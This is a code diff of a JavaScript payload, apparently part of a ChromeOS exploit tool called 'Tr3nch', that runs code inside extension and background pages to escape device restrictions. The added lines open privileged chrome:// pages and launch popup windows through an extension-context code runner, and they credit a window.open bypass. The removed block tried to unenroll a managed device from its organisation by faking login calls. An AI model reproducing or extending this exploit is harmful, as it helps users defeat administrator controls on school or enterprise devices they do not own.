@@ -1,3 +1,4 @@
+
 chrome.runtime.getBackgroundPage((background) => {
 	function payload() {
 		const onMessage=function(msg) {
@@ -515,15 +516,19 @@ chrome.runtime.getBackgroundPage((background) => {
 					addPage('chrome://network');
 					addPage('chrome://policy');
 					addPage('chrome://bookmarks');
+
+					redirBox.append(document.createElement('br'));
+					
 					addPage('chrome://history');
 					addPage('chrome://inspect');
-					if (chromeVer < 87) {
-						addPage('chrome://terminal');
-					}
-					if (chromeVer < 109) {
-						/* The OOBE can't be accessed from user sessions past R109. */
-						if (navigator.appVersion.includes("CrOS")) addPage('chrome://oobe');
-					}
+					addPage('chrome://version');
+					addPage('chrome://system');
+					
+					/* This page was replaced with chrome-untrusted://terminal 
+					sometime around R87, which cannot be accessed by Tr3nch. */
+					if (chromeVer < 87) addPage('chrome://terminal');
+					/* The OOBE can't be accessed from user sessions past R109. */
+					if (chromeVer < 109 && navigator.appVersion.includes("CrOS")) addPage('chrome://oobe');
 					
 					container.append(redirBox);
 
@@ -887,6 +892,7 @@ chrome.runtime.getBackgroundPage((background) => {
 						</label>
 						<br>
 						<button id="proxyUrlButton">Launch Webview</button>
+						<button id="popupButton">Launch Popup</button>
 						`;
 						proxyBox.querySelector('#proxyUrlButton').addEventListener('click', () => {
 							/* Thanks bypassi, for the broken SWA window.open bypass! */
@@ -921,6 +927,9 @@ chrome.runtime.getBackgroundPage((background) => {
 								</style>
 								`;
 							}
+						});
+						proxyBox.querySelector('#popupButton').addEventListener('click', () => {
+							asExt(`chrome.windows.create({url: "${document.querySelector('#proxyUrlBox').value}", type: "popup"});`);
 						});
 
 						if (chrome.runtime.getManifest().permissions.includes("identity")) {
@@ -985,29 +994,6 @@ chrome.runtime.getBackgroundPage((background) => {
 						});
 
 						container.append(killBox);
-					}
-					if (perms.includes("unenroll")) {
-						let oobeBox=document.createElement('div');
-						oobeBox.innerHTML=`
-						<br>
-						<h1>Unenroll</h1>
-						<hr>
-						<p>Remove your device from its current management.</p>
-						<br>
-						<button id="unenrollButton">Deprovision Device</button>
-						`;
-						oobeBox.querySelector('#unenrollButton').addEventListener('click', () => {
-							const unenroll=function() {
-								chrome.send('skipToLoginForTesting');
-								chrome.networkingPrivate.disableNetworkType('All');
-								chrome.send('completeLogin', [Math.floor(Math.random() * (21 ** 10)).toString(), "whopper@gmail.com", "whopper", false]);
-								chrome.send('oauthEnrollAttributes', ['','']);
-								chrome.send('oauthEnrollClose', ['done']);
-							}
-							asPage(`${uneneroll.toString()};unenroll();window.close();`);
-						});
-
-						/* container.append(oobeBox); */ /* For testing! Do not uncomment until it has been proven to work. */
 					}
 					container.append(document.createElement('br')); /* Whitespace just to make me feel better */
 					
